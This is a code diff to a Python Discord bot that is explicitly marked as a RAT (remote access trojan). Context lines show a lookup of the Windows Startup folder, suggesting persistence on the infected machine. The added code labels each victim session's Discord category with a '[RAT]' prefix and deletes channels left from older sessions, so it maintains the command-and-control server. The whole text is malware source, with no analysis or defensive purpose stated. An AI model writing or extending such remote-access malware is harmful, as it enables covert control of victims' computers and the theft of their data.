@@ -14,6 +14,9 @@ server_id = os.getenv("SERVER_ID")
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
 session_name_len = 10
+prefix_for_marking = "[RAT]"
+delete_old_channels = True 
+
 def get_startup_folder():
     # Open the registry key for the Startup folder path
     key = r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'
@@ -39,30 +42,43 @@ print(new_temp_dir)
 async def on_ready():
     print(f'Logged in as {bot.user}!')
     guild = bot.get_guild(int(server_id))
-    if not discord.utils.get(guild.categories, name=session_name):
+    if not discord.utils.get(guild.categories, name=prefix_for_marking+session_name):
         try:
-            await guild.create_category(name=session_name)
-            print(f"Created category '{session_name}' in '{guild.name}'")
+            await guild.create_category(name=prefix_for_marking+session_name)
+            print(f"Created category '{prefix_for_marking+session_name}' in '{guild.name}'")
         except discord.Forbidden:
             print(f"Missing permissions to create a category in '{guild.name}'.")
         except discord.HTTPException as e:
             print(f"Failed to create category in '{guild.name}': {e}")
         
     else:
-        print(f"Category '{session_name}' already exists in '{guild.name}'.")
+        print(f"Category '{prefix_for_marking+session_name}' already exists in '{guild.name}'.")
     
-    category = discord.utils.get(guild.categories, name=session_name)
+    category = discord.utils.get(guild.categories, name=prefix_for_marking+session_name)
     channel_names = ['Main']
     for channel_name in channel_names:
         if not discord.utils.get(guild.channels, name=channel_name):
             try:
                 await guild.create_text_channel(name=channel_name, category=category)
-                print(f"Created channel {channel_name} in category '{session_name}' in '{guild.name}'.")
+                print(f"Created channel {channel_name} in category '{prefix_for_marking+session_name}' in '{guild.name}'.")
 
             except discord.Forbidden:
-                print(f"Missing permissions to create a channel in category '{session_name}' in '{guild.name}'.")
+                print(f"Missing permissions to create a channel in category '{prefix_for_marking+session_name}' in '{guild.name}'.")
             except discord.HTTPException as e:
                 print(f"Failed to create channel in '{guild.name}': {e}")
+    
+    #Deleting old channels can be turned off
+    if delete_old_channels:
+        for category in guild.categories:
+            if category.name.startswith(prefix_for_marking) and not category.name.endswith(session_name):
+                for channel in category.channels:
+                    await channel.delete()
+                await category.delete()
+        
+    print('done')    
+        
+
+
             
 
     
